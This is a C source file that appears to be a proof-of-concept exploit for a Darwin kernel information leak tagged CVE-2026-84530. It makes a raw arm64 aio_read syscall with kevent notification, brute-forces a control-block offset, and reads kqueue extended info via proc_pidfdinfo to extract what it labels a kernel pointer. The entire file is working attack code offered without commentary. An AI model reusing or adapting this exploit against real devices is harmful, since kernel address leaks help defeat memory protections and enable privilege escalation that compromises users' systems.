#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <aio.h>
#include <sys/event.h>
#include <sys/types.h>

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
#define PROC_PIDFDKQUEUE_EXTINFO 9
#define SIGEV_KEVENT_VAL         3
#define EVFILT_AIO_VAL           ((int16_t)(-3))
#define KQEXT_SDATA_OFFSET       72
#define KQEXT_STRIDE             88

static char g_result[2048];

/* naked arm64 Darwin raw syscall */
/* x0 = cb ptr (arg0), x16 = 255 (SYS_aio_read), svc #0x80 */
/* returns: 0 on success, positive errno on error */
__attribute__((naked))
static int raw_aio_read(void *cb) {
    __asm__(
        "mov x16, #255\n"
        "svc #0x80\n"
        "ret\n"
    );
}

uint64_t cve_84530_leak(void) {
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    char tmppath[512];
    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio.bin", home);
    int wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (wfd < 0) {
        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_%d.bin", (int)getpid());
        wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    }
    write(wfd, "CVE-2026-84530-TEST", 19);
    close(wfd);

    int fd = open(tmppath, O_RDONLY);
    if (fd < 0) {
        snprintf(g_result, sizeof(g_result), "open failed errno=%d", errno);
        return 0;
    }

    /* separate buffers for probe vs kevent */
    static char probe_buf[64];
    static char kev_buf[64];

    /* step 1: SIGEV_NONE via libSystem to confirm AIO works */
    struct aiocb probe;
    memset(&probe, 0, sizeof(probe));
    probe.aio_fildes = fd;
    probe.aio_buf    = probe_buf;
    probe.aio_nbytes = 8;
    probe.aio_offset = 0;
    probe.aio_sigevent.sigev_notify = 0;
    if (aio_read(&probe) != 0) {
        snprintf(g_result, sizeof(g_result),
            "SIGEV_NONE failed errno=%d", errno);
        close(fd); return 0;
    }
    /* properly wait + clean up so libSystem tracking is cleared */
    const struct aiocb *pl[1] = { &probe };
    aio_suspend(pl, 1, NULL);
    aio_return(&probe);

    /* step 2: SIGEV_KEVENT via raw syscall, brute force offset */
    for (int off = 32; off <= 120; off += 4) {
        int kq = kqueue();
        if (kq < 0) continue;

        /* 256-byte buffer on heap to avoid stack issues */
        char *cb = (char *)calloc(1, 256);
        if (!cb) { close(kq); continue; }

        *(int      *)(cb +  0) = fd;
        *(int64_t  *)(cb +  8) = 0;
        *(void    **)(cb + 16) = kev_buf;
        *(uint64_t *)(cb + 24) = 8;
        *(int      *)(cb + 32) = 0;
        *(int      *)(cb + 40) = SIGEV_KEVENT_VAL;
        *(int      *)(cb + off) = kq;

        int ret = raw_aio_read(cb);
        free(cb);

        if (ret == 0) {
            usleep(50000);
            uint8_t ext[4096];
            memset(ext, 0, sizeof(ext));
            int n = proc_pidfdinfo(getpid(), kq,
                PROC_PIDFDKQUEUE_EXTINFO, ext, (int)sizeof(ext));
            if (n > 0) {
                for (int i = 0; i < n / KQEXT_STRIDE; i++) {
                    uint8_t  *e = ext + i * KQEXT_STRIDE;
                    int16_t   f = *(int16_t  *)(e + 8);
                    int64_t   d = *(int64_t  *)(e + 32);
                    uint64_t  s = *(uint64_t *)(e + KQEXT_SDATA_OFFSET);
                    if (f == EVFILT_AIO_VAL) {
                        snprintf(g_result, sizeof(g_result),
                            "SUCCESS CVE-2026-84530\n"
                            "kq_offset=%d\n"
                            "kqext_kev.data=0x%llx\n"
                            "kqext_sdata=0x%llx <- KERNEL PTR",
                            off,
                            (unsigned long long)d,
                            (unsigned long long)s);
                        close(kq); close(fd);
                        return s;
                    }
                }
                snprintf(g_result, sizeof(g_result),
                    "raw ok off=%d %d knotes no EVFILT_AIO",
                    off, n/KQEXT_STRIDE);
            } else {
                snprintf(g_result, sizeof(g_result),
                    "raw ok off=%d proc_pidfdinfo errno=%d", off, errno);
            }
            close(kq); close(fd); return 0;
        }
        if (ret != 22) {
            snprintf(g_result, sizeof(g_result),
                "off=%d raw ret=%d (not EINVAL)", off, ret);
            close(kq); close(fd); return 0;
        }
        close(kq);
    }

    snprintf(g_result, sizeof(g_result),
        "SIGEV_NONE OK\n"
        "raw syscall: all offsets EINVAL (errno=22)\n"
        "kernel rejects SIGEV_KEVENT on this build");
    close(fd);
    return 0;
}

const char *cve_84530_leak_str(void) { return g_result; }
